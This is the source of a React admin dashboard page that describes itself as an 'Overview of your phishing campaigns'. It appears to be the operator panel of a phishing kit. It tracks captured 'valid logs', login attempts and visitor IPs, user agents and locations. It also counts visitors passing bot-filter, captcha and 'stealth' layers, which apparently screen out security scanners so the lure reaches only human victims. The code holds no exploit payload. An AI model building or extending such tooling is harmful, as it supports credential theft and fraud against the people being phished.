'use client'

import { useEffect, useState } from 'react'
import AdminLayout from '@/components/admin/AdminLayout'
import { 
  Users, 
  Shield, 
  AlertTriangle, 
  CheckCircle,
  RefreshCw,
  Download
} from 'lucide-react'

interface VisitorLog {
  id: string
  timestamp: number
  ip: string
  userAgent: string
  country: string
  city: string
  captchaStatus: 'verified' | 'failed' | 'pending'
  botStatus: 'human' | 'bot' | 'suspicious'
  layer: string
}

interface DashboardStats {
  totalVisitors: number
  totalVisits: number // Total visits = all visitor logs
  validLogs: number
  invalidLogs: number
  botsDetected: number
  validVisitors: number
  byLayer: {
    botFilterPassed: number
    captchaPassed: number
    stealthPassed: number
    loginAttempts: number
  }
  byTime: {
    last24h: number
    lastHour: number
  }
}

export default function DashboardPage() {
  const [stats, setStats] = useState<DashboardStats | null>(null)
  const [logs, setLogs] = useState<VisitorLog[]>([])
  const [loading, setLoading] = useState(true)
  const [countryFilter, setCountryFilter] = useState('all')
  const [botFilter, setBotFilter] = useState('all')
  const [countries, setCountries] = useState<string[]>([])
  
  const loadData = async () => {
    setLoading(true)
    try {
      // Load stats
      const statsRes = await fetch('/api/admin/visitor-logs?action=stats')
      const statsData = await statsRes.json()
      setStats(statsData)
      
      // Load countries
      const countriesRes = await fetch('/api/admin/visitor-logs?action=countries')
      const countriesData = await countriesRes.json()
      setCountries(countriesData.countries || [])
      
      // Load logs
      const logsRes = await fetch(`/api/admin/visitor-logs?country=${countryFilter}&botStatus=${botFilter}`)
      const logsData = await logsRes.json()
      setLogs(logsData.logs || [])
    } catch (error) {
    } finally {
      setLoading(false)
    }
  }
  
  useEffect(() => {
    loadData()
    
    // Auto-refresh every 10 seconds
    const interval = setInterval(loadData, 10000)
    return () => clearInterval(interval)
  }, [countryFilter, botFilter])
  
  const exportData = () => {
    const csv = [
      ['ID', 'Timestamp', 'IP', 'Country', 'City', 'Captcha', 'Bot Status', 'Layer'],
      ...logs.map(log => [
        log.id,
        new Date(log.timestamp).toLocaleString(),
        log.ip,
        log.country,
        log.city,
        log.captchaStatus,
        log.botStatus,
        log.layer
      ])
    ].map(row => row.join(',')).join('\n')
    
    const blob = new Blob([csv], { type: 'text/csv' })
    const url = URL.createObjectURL(blob)
    const a = document.createElement('a')
    a.href = url
    a.download = `visitor-logs-${Date.now()}.csv`
    a.click()
  }
  
  if (loading && !stats) {
    return (
      <AdminLayout>
        <div className="flex items-center justify-center h-64">
          <div className="animate-spin rounded-full h-12 w-12 border-b-2 border-blue-600"></div>
        </div>
      </AdminLayout>
    )
  }
  
  return (
    <AdminLayout>
      <div className="space-y-6">
        {/* Header */}
        <div className="flex justify-between items-center">
          <div>
            <h1 className="text-2xl font-bold text-gray-900 dark:text-white">Dashboard</h1>
            <p className="text-gray-400 dark:text-gray-500">Overview of your phishing campaigns</p>
          </div>
          <button
            onClick={loadData}
            className="px-4 py-2 bg-blue-600 hover:bg-blue-700 rounded-lg flex items-center gap-2 text-white"
          >
            <RefreshCw className="w-4 h-4" />
            Refresh
          </button>
        </div>
        
        {/* Statistics Cards */}
        <div className="grid grid-cols-4 gap-6">
          {/* Valid Logs */}
          <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md border border-gray-200 dark:border-gray-700 p-6">
            <div className="flex justify-between items-start">
              <div>
                <p className="text-gray-400 dark:text-gray-500 text-sm">Valid Logs</p>
                <h2 className="text-4xl font-bold mt-2 text-gray-900 dark:text-white">{stats?.validLogs || 0}</h2>
                <p className="text-sm text-gray-400 dark:text-gray-500 mt-1">Successful operations</p>
              </div>
              <div className="w-12 h-12 bg-green-600 rounded-full flex items-center justify-center">
                <CheckCircle className="w-6 h-6 text-white" />
              </div>
            </div>
          </div>
          
          {/* Total Visits */}
          <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md border border-gray-200 dark:border-gray-700 p-6">
            <div className="flex justify-between items-start">
              <div>
                <p className="text-gray-400 dark:text-gray-500 text-sm">Total Visits</p>
                <h2 className="text-4xl font-bold mt-2 text-gray-900 dark:text-white">{stats?.totalVisits || 0}</h2>
                <p className="text-sm text-gray-400 dark:text-gray-500 mt-1">All visitor traffic</p>
              </div>
              <div className="w-12 h-12 bg-yellow-600 rounded-full flex items-center justify-center">
                <Users className="w-6 h-6 text-white" />
              </div>
            </div>
          </div>
          
          {/* Bots Detected */}
          <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md border border-gray-200 dark:border-gray-700 p-6">
            <div className="flex justify-between items-start">
              <div>
                <p className="text-gray-400 dark:text-gray-500 text-sm">Bots Detected</p>
                <h2 className="text-4xl font-bold mt-2 text-gray-900 dark:text-white">{stats?.botsDetected || 0}</h2>
                <p className="text-sm text-gray-400 dark:text-gray-500 mt-1">Automated traffic</p>
              </div>
              <div className="w-12 h-12 bg-red-600 rounded-full flex items-center justify-center">
                <Shield className="w-6 h-6 text-white" />
              </div>
            </div>
          </div>
          
          {/* Valid Visitors */}
          <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md border border-gray-200 dark:border-gray-700 p-6">
            <div className="flex justify-between items-start">
              <div>
                <p className="text-gray-400 dark:text-gray-500 text-sm">Valid Visitors</p>
                <h2 className="text-4xl font-bold mt-2 text-gray-900 dark:text-white">{stats?.validVisitors || 0}</h2>
                <p className="text-sm text-gray-400 dark:text-gray-500 mt-1">Human traffic</p>
              </div>
              <div className="w-12 h-12 bg-blue-600 rounded-full flex items-center justify-center">
                <Users className="w-6 h-6 text-white" />
              </div>
            </div>
          </div>
        </div>
        
        {/* Visitor Analytics Section */}
        <div className="bg-white dark:bg-gray-800 rounded-lg shadow-md border border-gray-200 dark:border-gray-700 p-6">
          <div className="flex justify-between items-center mb-6">
            <div>
              <h3 className="text-xl font-semibold flex items-center gap-2 text-gray-900 dark:text-white">
                <Users className="w-5 h-5 text-red-500" />
                Visitor Analytics
              </h3>
              <p className="text-sm text-gray-400 dark:text-gray-500">Real-time visitor data and system logs</p>
            </div>
            <div className="flex gap-3">
              <button
                onClick={loadData}
                className="px-4 py-2 border border-red-500 text-red-500 hover:bg-red-500/10 rounded-lg flex items-center gap-2 transition-colors"
              >
                <RefreshCw className="w-4 h-4" />
                Refresh
              </button>
              <button
                onClick={exportData}
                className="px-4 py-2 bg-green-600 hover:bg-green-700 rounded-lg flex items-center gap-2 text-white transition-colors"
              >
                <Download className="w-4 h-4" />
                Export
              </button>
            </div>
          </div>
          
          {/* Filters */}
          <div className="grid grid-cols-2 gap-4 mb-6">
            <div>
              <label className="block text-sm mb-2 text-gray-700 dark:text-gray-300">Filter by Country</label>
              <select
                value={countryFilter}
                onChange={(e) => setCountryFilter(e.target.value)}
                className="w-full px-4 py-2 bg-white dark:bg-gray-700 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-900 dark:text-white"
              >
                <option value="all">All Countries</option>
                {countries.map(country => (
                  <option key={country} value={country}>{country}</option>
                ))}
              </select>
            </div>
            <div>
              <label className="block text-sm mb-2 text-gray-700 dark:text-gray-300">Filter by Bot Status</label>
              <select
                value={botFilter}
                onChange={(e) => setBotFilter(e.target.value)}
                className="w-full px-4 py-2 bg-white dark:bg-gray-700 border border-gray-300 dark:border-gray-600 rounded-lg text-gray-900 dark:text-white"
              >
                <option value="all">All Traffic</option>
                <option value="human">Human Only</option>
                <option value="bot">Bots Only</option>
                <option value="suspicious">Suspicious Only</option>
              </select>
            </div>
          </div>
          
          {/* Stats Row */}
          <div className="grid grid-cols-2 gap-4 mb-6">
            <div className="bg-gray-100 dark:bg-gray-700 rounded p-4 text-center">
              <p className="text-sm text-gray-400 dark:text-gray-500">Total Entries</p>
              <p className="text-2xl font-bold text-red-500">{logs.length}</p>
            </div>
            <div className="bg-gray-100 dark:bg-gray-700 rounded p-4 text-center">
              <p className="text-sm text-gray-400 dark:text-gray-500">Last Update</p>
              <p className="text-2xl font-bold text-cyan-500">Just now</p>
            </div>
          </div>
          
          {/* Visitor Table */}
          <div className="overflow-x-auto">
            <table className="w-full">
              <thead>
                <tr className="border-b border-gray-200 dark:border-gray-700">
                  <th className="px-4 py-3 text-left text-sm font-medium text-gray-700 dark:text-gray-300"># ID</th>
                  <th className="px-4 py-3 text-left text-sm font-medium text-gray-700 dark:text-gray-300">IP Address</th>
                  <th className="px-4 py-3 text-left text-sm font-medium text-gray-700 dark:text-gray-300">User Agent</th>
                  <th className="px-4 py-3 text-left text-sm font-medium text-gray-700 dark:text-gray-300">Captcha</th>
                  <th className="px-4 py-3 text-left text-sm font-medium text-gray-700 dark:text-gray-300">Country</th>
                  <th className="px-4 py-3 text-left text-sm font-medium text-gray-700 dark:text-gray-300">City</th>
                  <th className="px-4 py-3 text-left text-sm font-medium text-gray-700 dark:text-gray-300">Bot Status</th>
                </tr>
              </thead>
              <tbody>
                {logs.length === 0 ? (
                  <tr>
                    <td colSpan={7} className="px-4 py-8 text-center text-gray-400 dark:text-gray-500">
                      No visitor logs yet
                    </td>
                  </tr>
                ) : (
                  logs.map((log) => (
                    <tr key={log.id} className="border-b border-gray-200 dark:border-gray-700 hover:bg-gray-50 dark:hover:bg-gray-700/50">
                      <td className="px-4 py-3">
                        <span className="px-2 py-1 bg-blue-600 rounded text-sm text-white font-mono" title={log.id}>
                          {log.id.includes('_') ? `#${log.id.split('_').pop()?.substring(0, 8) || log.id.substring(log.id.length - 8)}` : `#${log.id.substring(0, 8)}`}
                        </span>
                      </td>
                      <td className="px-4 py-3 text-sm font-mono text-gray-600 dark:text-gray-400">
                        {log.ip}
                      </td>
                      <td className="px-4 py-3 text-sm text-gray-600 dark:text-gray-400 max-w-xs truncate">
                        {log.userAgent}
                      </td>
                      <td className="px-4 py-3">
                        <span className={`px-3 py-1 rounded-full text-xs ${
                          log.captchaStatus === 'verified' 
                            ? 'bg-green-600 text-white' 
                            : log.captchaStatus === 'failed'
                            ? 'bg-red-600 text-white'
                            : 'bg-yellow-600 text-white'
                        }`}>
                          {log.captchaStatus === 'verified' ? '✓ Verified' : log.captchaStatus === 'failed' ? '✗ Failed' : '⏳ Pending'}
                        </span>
                      </td>
                      <td className="px-4 py-3 text-sm text-gray-600 dark:text-gray-400">{log.country}</td>
                      <td className="px-4 py-3 text-sm text-gray-600 dark:text-gray-400">{log.city}</td>
                      <td className="px-4 py-3">
                        <span className={`px-3 py-1 rounded-full text-xs ${
                          log.botStatus === 'human' 
                            ? 'bg-green-600 text-white' 
                            : log.botStatus === 'bot'
                            ? 'bg-red-600 text-white'
                            : 'bg-yellow-600 text-white'
                        }`}>
                          {log.botStatus === 'human' ? '👤 Human' : log.botStatus === 'bot' ? '🤖 Bot' : '⚠️ Suspicious'}
                        </span>
                      </td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </AdminLayout>
  )
}
